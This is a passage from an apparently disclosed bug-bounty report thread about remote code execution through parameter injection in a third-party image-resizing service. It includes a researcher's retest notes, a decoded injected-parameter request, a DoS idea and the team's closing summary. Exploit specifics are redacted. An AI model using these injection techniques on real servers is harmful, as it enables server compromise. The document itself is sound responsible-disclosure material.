,\u003cbr\u003e\nYes, it appears to still be vulnerable. In fact, the original link still works. (Produces an HTTP GET request to my server).\u003cbr\u003e\nA new PoC of the RCE is appended as \u0026#39;PoC-OldMethodRCEAfterFix.png\u0026#39;\u003c/p\u003e\n\n\u003cp\u003eMoreover, I\u0026#39;ve examined the website with the fix applied to see what was changed. It seems that instead of replacing the old method (some images are still served with it), a new method was ADDED. \u003cbr\u003e\nI\u0026#39;ve examined the new method as well, so to see what would happen if the older one was removed. \u003cbr\u003e\nIt appears to be very similar, just more organized (no Non-readable Characters), and injecting parameters is still possible. As a PoC I\u0026#39;m appending a picture fetched with the NEW Method, originally intended to be resized as a small thumbnail, I\u0026#39;ve Flipped it and Enlarged it using parameter injection. This can be used to overload your server ( i.e. DoS), as resizing images is a resource-heavy process, and as I can inject parameters, I can ask the server to resize an image to huge dimensions with only a single request. \u003cbr\u003e\nThe PoC is appended as \u0026#39;PoC - NewMethodIsStillBad.png\u0026#39;.\u003c/p\u003e\n\n\u003cp\u003eA third picture is RCE with the new method, to show that it is still exploitable, even if the old one was to not be used anymore.\u003cbr\u003e\n\u0026#39;PoC- New Method RCE.png\u0026#39;\u003c/p\u003e\n\n\u003cp\u003eI would recommend saving various copies of the served images, (this can be done using a script), and just serving them statically to the user. Resizing on-the-go using user supplied parameters is a door to problems. \u003cbr\u003e\nIf that is absolutely not possible, take the parameters from the user (like Quality, ThumbSize), and validate their authenticity. For example, quality should be a number from 0-100, thumb size should be a number between 50-500 (beware of very large numbers). If you also need to take parameter names (\u0026#39;Interlace\u0026quot;, \u0026quot;strip\u0026quot;) etc., make a list of the allowed values and validate against it. The user supplied value should only be used in the command AFTER it is sanitized. Once again, this must be done correctly in order to avoid further problems, and it is better to just avoid the process of inserting user supplied input into OS commands, if possible.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-19T10:45:58.712Z","updated_at":"2018-01-19T10:59:57.300Z","actor":{"username":"yonm13","cleared":false,"url":"/yonm13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2323806,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Quick update - the third party responsible for this service is still working on finding a fix.","markdown_message":"\u003cp\u003eQuick update - the third party responsible for this service is still working on finding a fix.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-27T14:29:48.077Z","updated_at":"2018-01-27T14:29:48.077Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2355232,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi again, we have received a new fix and hoping this time it is for real. Could you recheck?","markdown_message":"\u003cp\u003eHi again, we have received a new fix and hoping this time it is for real. Could you recheck?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-06T10:24:00.937Z","updated_at":"2018-02-06T10:24:00.937Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2356325,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi. I've devoted a few hours to retesting, to see if I could break the mechanism.\nComing up with good and bad things:\n\nThe good:\n- First of all, It seems like the old PoC requests don't work anymore due to a new \"SHA\" mechanism, which supposedly validated the request contents. \n- I have not been able to trigger the RCE exploit anymore, nor bypass the new mechanism.\n\nThe bad:\n-The new mechnaism isn't hermetic: Some requests fetch data in a way that doesn't fully comply with the it. For example, ```https://toimitilat.lahitapiola.fi█████████``` Can be fetched without providing the \"sha\" parameter. I have not yet managed to escalate this into a real threat, but you should notice that this is still an interesting lead for an attacker.\n\n- Secondly, My guess is that the mechanism is still delivering the user supplied parameters into your parsing code. Sending payloads like ```https://toimitilat.lahitapiola.fi████████``` (Which resolve to ```[[\"f\",\"2017/12/14/16_19_42_███lkisivu_lt.jpg\"],[\"p\",\"convert\",\"-strip -interlace Plane -quality 80%\",null],[\"p\",\"thumb\",\"102x\"]```, cause the server to return \"internal server error\". This is due to the \"null\" parameter injected into the request. This differs from an expected behavior: The server does not reject the payload all at once.\n\n-Lastly, and most important, let me repeat as I've already mentioned: This solution is not considered a safe manner to control risky user input among the Information Security community, especially when we know that it may lead to RCE on the server. With enough patience, an attacker may be able to study (through trial an error), ██████████, allowing code execution as before. It might take long, but the attack surface exists, and it is not improbable. I guess this is ultimately your call.\n\nIf you choose to keep the ████ as a major point of security,I suggest to at least make sure that it uses some server-only secret as a seed for the hash, preferably combining ████████for the ultimate result, so it is by no means derivable or guessable from the original text.\n\nIf you have any more questions, don't hesitate to ask!","markdown_message":"\u003cp\u003eHi. I\u0026#39;ve devoted a few hours to retesting, to see if I could break the mechanism.\u003cbr\u003e\nComing up with good and bad things:\u003c/p\u003e\n\n\u003cp\u003eThe good:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eFirst of all, It seems like the old PoC requests don\u0026#39;t work anymore due to a new \u0026quot;SHA\u0026quot; mechanism, which supposedly validated the request contents. \u003c/li\u003e\n\u003cli\u003eI have not been able to trigger the RCE exploit anymore, nor bypass the new mechanism.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe bad:\u003cbr\u003e\n-The new mechnaism isn\u0026#39;t hermetic: Some requests fetch data in a way that doesn\u0026#39;t fully comply with the it. For example, \u003ccode\u003ehttps://toimitilat.lahitapiola.fi█████████\u003c/code\u003e Can be fetched without providing the \u0026quot;sha\u0026quot; parameter. I have not yet managed to escalate this into a real threat, but you should notice that this is still an interesting lead for an attacker.\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eSecondly, My guess is that the mechanism is still delivering the user supplied parameters into your parsing code. Sending payloads like \u003ccode\u003ehttps://toimitilat.lahitapiola.fi████████\u003c/code\u003e (Which resolve to \u003ccode\u003e[[\u0026quot;f\u0026quot;,\u0026quot;2017/12/14/16_19_42_███lkisivu_lt.jpg\u0026quot;],[\u0026quot;p\u0026quot;,\u0026quot;convert\u0026quot;,\u0026quot;-strip -interlace Plane -quality 80%\u0026quot;,null],[\u0026quot;p\u0026quot;,\u0026quot;thumb\u0026quot;,\u0026quot;102x\u0026quot;]\u003c/code\u003e, cause the server to return \u0026quot;internal server error\u0026quot;. This is due to the \u0026quot;null\u0026quot; parameter injected into the request. This differs from an expected behavior: The server does not reject the payload all at once.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e-Lastly, and most important, let me repeat as I\u0026#39;ve already mentioned: This solution is not considered a safe manner to control risky user input among the Information Security community, especially when we know that it may lead to RCE on the server. With enough patience, an attacker may be able to study (through trial an error), ██████████, allowing code execution as before. It might take long, but the attack surface exists, and it is not improbable. I guess this is ultimately your call.\u003c/p\u003e\n\n\u003cp\u003eIf you choose to keep the ████ as a major point of security,I suggest to at least make sure that it uses some server-only secret as a seed for the hash, preferably combining ████████for the ultimate result, so it is by no means derivable or guessable from the original text.\u003c/p\u003e\n\n\u003cp\u003eIf you have any more questions, don\u0026#39;t hesitate to ask!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-06T18:16:59.803Z","updated_at":"2018-02-23T10:35:45.104Z","actor":{"username":"yonm13","cleared":false,"url":"/yonm13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2423714,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We are closing this as resolved as we are happy enough with the fix. We are also considering disclosing this publicly and for that reason I have redacted some of the data. I want to know if you are comfortable with public disclosure? The elegance of the report deserves an audience in our opinion.","markdown_message":"\u003cp\u003eWe are closing this as resolved as we are happy enough with the fix. We are also considering disclosing this publicly and for that reason I have redacted some of the data. I want to know if you are comfortable with public disclosure? The elegance of the report deserves an audience in our opinion.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-22T23:48:32.741Z","updated_at":"2018-02-22T23:48:32.741Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"yonm13","url":"/yonm13"},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2424958,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi. The redaction seems fair, except for still including the IP address of my amazon test server which I'd rather not have posted online. \nThis appears in some of the messages and also within the pictures. Perhaps we should choose one or two pictures as PoC and black out the IP addresses, or just choose a shortened version of the report?\nPictures throughout the report also reveal information about the server, such as the full path of the working directory (see on the first report).\n\nAlso - note that finding some of the full original URLs (especially the later ones) should not be hard for an attacker, as they are acquired by regularly surfing the website and looking at the images. \nMoreover, my last message opens leads for other researchers (/attackers) to further exploit. Is this desirable?\n\nThanks!","markdown_message":"\u003cp\u003eHi. The redaction seems fair, except for still including the IP address of my amazon test server which I\u0026#39;d rather not have posted online. \u003cbr\u003e\nThis appears in some of the messages and also within the pictures. Perhaps we should choose one or two pictures as PoC and black out the IP addresses, or just choose a shortened version of the report?\u003cbr\u003e\nPictures throughout the report also reveal information about the server, such as the full path of the working directory (see on the first report).\u003c/p\u003e\n\n\u003cp\u003eAlso - note that finding some of the full original URLs (especially the later ones) should not be hard for an attacker, as they are acquired by regularly surfing the website and looking at the images. \u003cbr\u003e\nMoreover, my last message opens leads for other researchers (/attackers) to further exploit. Is this desirable?\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-23T09:42:16.676Z","updated_at":"2018-02-23T09:42:16.676Z","actor":{"username":"yonm13","cleared":false,"url":"/yonm13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2425051,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok so like this a few action points for me:\n1) Make sure that your ip-addresses are not visible in the text (I missed this completely!)\n2) Have all the current pictures removed\n\nAnd an action point for you:\n3) Choose a couple of good informational pictures, redact / blackout certain information, and add them to the report\n\nAnd for the question regarding further exploits - this is not directly undesirable either. I might redact some of your writing further in regards to this, but we are still thinking about this. The risk is identified though.","markdown_message":"\u003cp\u003eOk so like this a few action points for me:\u003cbr\u003e\n1) Make sure that your ip-addresses are not visible in the text (I missed this completely!)\u003cbr\u003e\n2) Have all the current pictures removed\u003c/p\u003e\n\n\u003cp\u003eAnd an action point for you:\u003cbr\u003e\n3) Choose a couple of good informational pictures, redact / blackout certain information, and add them to the report\u003c/p\u003e\n\n\u003cp\u003eAnd for the question regarding further exploits - this is not directly undesirable either. I might redact some of your writing further in regards to this, but we are still thinking about this. The risk is identified though.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-23T10:24:24.164Z","updated_at":"2018-02-23T10:24:24.164Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2426996,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Action points 1) and 2) are now completed.","markdown_message":"\u003cp\u003eAction points 1) and 2) are now completed.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-23T20:29:17.191Z","updated_at":"2018-02-23T20:29:17.191Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2427030,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the update. Unfortunately, I am away from my computer (where the original images are stored) for the weekend, and since they are not here anymore, I cannot download and edit them (oops?). If you care to send them to my email (████), I can take care of this tomorrow morning. Otherwise, I'm afraid this will have to wait until the beginning of next week.\nSorry about that!","markdown_message":"\u003cp\u003eThanks for the update. Unfortunately, I am away from my computer (where the original images are stored) for the weekend, and since they are not here anymore, I cannot download and edit them (oops?). If you care to send them to my email (████), I can take care of this tomorrow morning. Otherwise, I\u0026#39;m afraid this will have to wait until the beginning of next week.\u003cbr\u003e\nSorry about that!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-23T20:40:30.053Z","updated_at":"2018-02-27T13:31:08.953Z","actor":{"username":"yonm13","cleared":false,"url":"/yonm13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2427108,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No problem, next week is just fine. Have a nice weekend away from your computer.","markdown_message":"\u003cp\u003eNo problem, next week is just fine. Have a nice weekend away from your computer.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-23T21:27:25.091Z","updated_at":"2018-02-23T21:27:25.091Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2434136,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Got two: one for the initial report, and one after the first change.","markdown_message":"\u003cp\u003eGot two: one for the initial report, and one after the first change.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-26T12:48:48.730Z","updated_at":"2018-02-26T12:48:48.730Z","actor":{"username":"yonm13","cleared":false,"url":"/yonm13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":266981,"filename":"RCE_POC.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/266/981/3137984895b8765a4d279e9e7ce92e4d6d2df168/RCE_POC.png?response-content-disposition=attachment%3B%20filename%3D%22RCE_POC.png%22%3B%20filename%2A%3DUTF-8%27%27RCE_POC.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052947Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEAqT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026X-Amz-Signature=5f8847942f450e191a51d9fd246851d3fd0e110a47dcef265ee31f6330eeb8d3"},{"id":266980,"filename":"NEW_RCE_POC.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/266/980/d019f7c2f880b2133b936692013382a9c937897b/NEW_RCE_POC.png?response-content-disposition=attachment%3B%20filename%3D%22NEW_RCE_POC.png%22%3B%20filename%2A%3DUTF-8%27%27NEW_RCE_POC.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052947Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEAqT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026X-Amz-Signature=a1b9e7214b00829899165c8731bdc6237374c4e76edac5ae602e0b1a312f37a6"}],"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2437132,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for the additional effort. We are done here and we can now do a disclosure.","markdown_message":"\u003cp\u003eThanks for the additional effort. We are done here and we can now do a disclosure.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-27T04:31:18.761Z","updated_at":"2018-02-27T04:31:18.761Z","first_to_agree":true,"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2438357,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-27T11:29:45.581Z","updated_at":"2018-02-27T11:29:45.581Z","actor":{"username":"yonm13","cleared":false,"url":"/yonm13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2438358,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-27T11:29:45.667Z","updated_at":"2018-02-27T11:29:45.667Z","actor":{"username":"yonm13","cleared":false,"url":"/yonm13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2676266,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Added a bonus for some extra curricular activities provided by the reporter.","markdown_message":"\u003cp\u003eAdded a bonus for some extra curricular activities provided by the reporter.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-28T15:20:20.827Z","updated_at":"2018-04-28T15:20:20.827Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"LocalTapiola"}},"bounty_amount":"0.0","bounty_currency":"usd","bonus_amount":"500.0","genius_execution_id":null,"team_handle":"localtapiola","collaborator":{"username":"yonm13","url":"/yonm13"},"actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":6682,"category":"team","content":"##Issue\n\nThe reporter found an intricate way of performing an RCE against the server.  The issue arose from a design where the service is using a command line tool to dynamically resize images on the fly. The reporter managed to find a weakness in the way the process was implemented. An attack against this flaw would have lead to a total compromise of the server. \n\n##Fix\nUsing and calling command line tools - as pointed out by the reporter many times - is considered very bad practice. Controlling and sanitizing input to a level that is truly secure is almost impossible. On the other hand, fixing an issue like this is not straightforward due to the fact that the implementation not just contains a technical flaw it also more or less contains an architectural and principal flaw. The reporter assisted in testing the fix which in the end lead to an acceptable although not perfect result.\n\n\n##Reasoning\n\nThe reported case was valid and within the scope of the bug bounty program. Although this service is a part of the LahiTapiola bug bounty program, it is actually a shared platform operated by a third party. LahiTapiola is just one of many corporate users. Fixing the issue was in part coordinated by LahiTapiola to ensure that the width and the breadth of the issue was understood by all affected and involved parties, and that no details were leaked ahead of time as not to put anyone at risk. \n\nThe service does not contain any LahiTapiola customer information nor is it part of the core systems at LahiTapiola. Even if fully owned, the server would not pose a direct threat to other LahiTapiola services - any pivoting to the core internal networks would not have been possible. From a bounty point of view, LahiTapiola always assesses reports from a business perspective.\n\nThe issue is fixed, although not perfectly in any way. Further reports on this matter must provide more actual proof than just repeating the conclusions of this report to be eligible for processing. For any developer reading this report, this can be considered a true learning opportunity.\n\nLahiTapiola wishes to thank the reporter for a valid and valuable report and for patience and assistance during the process of fixing.","can_view?":true,"can_edit?":false,"content_html":"\u003ch2 id=\"issue\"\u003eIssue\u003c/h2\u003e\n\n\u003cp\u003eThe reporter found an intricate way of performing an RCE against the server.  The issue arose from a design where the service is using a command line tool to dynamically resize images on the fly. The reporter managed to find a weakness in the way the process was implemented. An attack against this flaw would have lead to a total compromise of the server. \u003c/p\u003e\n\n\u003ch2 id=\"fix\"\u003eFix\u003c/h2\u003e\n\n\u003cp\u003eUsing and calling command line tools - as pointed out by the reporter many times - is considered very bad practice. Controlling and sanitizing input to a level that is truly secure is almost impossible. On the other hand, fixing an issue like this is not straightforward due to the fact that the implementation not just contains a technical flaw it also more or less contains an architectural and principal flaw. The reporter assisted in testing the fix which in the end lead to an acceptable although not perfect result.\u003c/p\u003e\n\n\u003ch2 id=\"reasoning\"\u003eReasoning\u003c/h2\u003e\n\n\u003cp\u003eThe reported case was valid and within the scope of the bug bounty program. Although this service is a part of the LahiTapiola bug bounty program, it is actually a shared platform operated by a third party. LahiTapiola is just one of many corporate users. Fixing the issue was in part coordinated by LahiTapiola to ensure that the width and the breadth of the issue was understood by all affected and involved parties, and that no details were leaked ahead of time as not to put anyone at risk. \u003c/p\u003e\n\n\u003cp\u003eThe service does not contain any LahiTapiola customer information nor is it part of the core systems at LahiTapiola. Even if fully owned, the server would not pose a direct threat to other LahiTapiola services - any pivoting to the core internal networks would not have been possible. From a bounty point of view, LahiTapiola always assesses reports from a business perspective.\u003c/p\u003e\n\n\u003cp\u003eThe issue is fixed, although not perfectly in any way. Further reports on this matter must provide more actual proof than just repeating the conclusions of this report to be eligible for processing. For any developer reading this report, this can be considered a true learning opportunity.\u003c/p\u003e\n\n\u003cp\u003eLahiTapiola wishes to thank the reporter for a valid and valuable report and for patience and assistance during the process of fixing.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}